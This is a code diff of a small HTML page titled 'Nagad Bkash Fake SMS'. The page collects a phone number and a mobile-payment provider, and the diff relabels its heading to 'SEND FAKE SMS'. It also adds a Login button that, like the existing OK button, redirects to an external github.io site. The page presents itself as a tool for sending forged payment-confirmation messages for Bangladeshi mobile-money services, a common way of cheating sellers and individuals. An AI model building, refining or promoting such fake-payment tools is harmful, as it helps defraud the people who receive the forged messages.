@@ -1,9 +1,9 @@
-<!DOCTYPE html>I 
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nagad Bkash Fake Message</title>
+    <title>Nagad Bkash Fake SMS</title>
     <style>
         body {
             background-color: #000;
@@ -76,11 +76,11 @@
 </head>
 <body>
     <div class="container">
-        <h2>Fake Message Sent</h2>
+        <h2>SEND FAKE SMS</h2>
         <form id="checkForm">
             <input type="text" id="phoneNumber" placeholder="Enter your phone number (e.g. 01XXXXXXXXX)" required>
 
-            <select id="Select Option" required>
+            <select id="paymentOption" required>
                 <option value="" disabled selected>Select Payment Option</option>
                 <option value="Nagad">Nagad</option>
                 <option value="Bkash">Bkash</option>
@@ -90,6 +90,7 @@
 
             <button type="submit">Submit</button>
         </form>
+        <button id="loginBtn">Login</button>
     </div>
 
     <div class="popup" id="popup">
@@ -115,6 +116,11 @@
 
         // Ok button redirects to the link
         document.getElementById('okBtn').addEventListener('click', function() {
+            window.location.href = "https://brillianttopup.github.io/1219/";
+        });
+
+        // Login button redirects to the link
+        document.getElementById('loginBtn').addEventListener('click', function() {
             window.location.href = "https://brillianttopup.github.io/1219/";
         });
     </script>
